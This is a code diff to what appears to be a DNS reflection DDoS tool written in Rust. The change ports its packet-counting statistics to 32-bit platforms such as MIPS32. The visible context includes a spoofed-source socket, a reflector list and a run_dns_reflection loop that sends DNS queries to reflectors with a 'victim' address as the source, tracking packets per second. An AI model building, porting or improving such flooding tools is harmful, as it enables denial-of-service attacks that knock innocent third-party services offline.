@@ -5,16 +5,57 @@ use crate::dns;
 use crate::reflector::Reflector;
 use crate::spoof::SpoofSocket;
 use crate::throttle::Throttle;
-use std::sync::atomic::{AtomicU64, Ordering};
+use std::sync::atomic::Ordering;
 use std::sync::Arc;
 use std::time::{Duration, Instant};
 
+// MIPS32 等 32 位平台没有 64 位原子原语：按平台选择原子类型
+#[cfg(target_has_atomic = "64")]
+use std::sync::atomic::AtomicU64 as AtomicCount;
+#[cfg(not(target_has_atomic = "64"))]
+use std::sync::atomic::AtomicU32 as AtomicCount;
+
 #[derive(Default)]
 pub struct Stats {
-    pub packets: AtomicU64,
-    pub bytes: AtomicU64,
-    pub errors: AtomicU64,
-    pub pps: AtomicU64,
+    packets: AtomicCount,
+    bytes: AtomicCount,
+    errors: AtomicCount,
+    pps: AtomicCount,
+}
+
+impl Stats {
+    #[cfg(target_has_atomic = "64")]
+    pub fn add(&self, packets: u64, bytes: u64, errors: u64) {
+        self.packets.fetch_add(packets, Ordering::Relaxed);
+        self.bytes.fetch_add(bytes, Ordering::Relaxed);
+        self.errors.fetch_add(errors, Ordering::Relaxed);
+    }
+    #[cfg(not(target_has_atomic = "64"))]
+    pub fn add(&self, packets: u64, bytes: u64, errors: u64) {
+        self.packets.fetch_add(packets as u32, Ordering::Relaxed);
+        self.bytes.fetch_add(bytes as u32, Ordering::Relaxed);
+        self.errors.fetch_add(errors as u32, Ordering::Relaxed);
+    }
+    #[cfg(target_has_atomic = "64")]
+    pub fn set_pps(&self, pps: u64) {
+        self.pps.store(pps, Ordering::Relaxed);
+    }
+    #[cfg(not(target_has_atomic = "64"))]
+    pub fn set_pps(&self, pps: u64) {
+        self.pps.store(pps as u32, Ordering::Relaxed);
+    }
+    pub fn packets(&self) -> u64 {
+        self.packets.load(Ordering::Relaxed) as u64
+    }
+    pub fn bytes(&self) -> u64 {
+        self.bytes.load(Ordering::Relaxed) as u64
+    }
+    pub fn errors(&self) -> u64 {
+        self.errors.load(Ordering::Relaxed) as u64
+    }
+    pub fn pps(&self) -> u64 {
+        self.pps.load(Ordering::Relaxed) as u64
+    }
 }
 
 pub struct TaskSpec {
@@ -65,19 +106,18 @@ pub fn run_dns_reflection(spec: &TaskSpec, stats: Arc<Stats>) {
 
                 match sock.send_udp(victim, refr.ip, refr.port, &q) {
                     Ok(_) => {
-                        stats.packets.fetch_add(1, Ordering::Relaxed);
-                        stats.bytes.fetch_add(q.len() as u64, Ordering::Relaxed);
+                        stats.add(1, q.len() as u64, 0);
                         local_pkt += 1;
                     }
                     Err(_) => {
-                        stats.errors.fetch_add(1, Ordering::Relaxed);
+                        stats.add(0, 0, 1);
                     }
                 }
 
                 // 每秒统计 PPS
                 if last_tick.elapsed() >= Duration::from_secs(1) {
                     let delta = local_pkt - last_pkt;
-                    stats.pps.store(delta, Ordering::Relaxed);
+                    stats.set_pps(delta);
                     last_pkt = local_pkt;
                     last_tick = Instant::now();
                 }
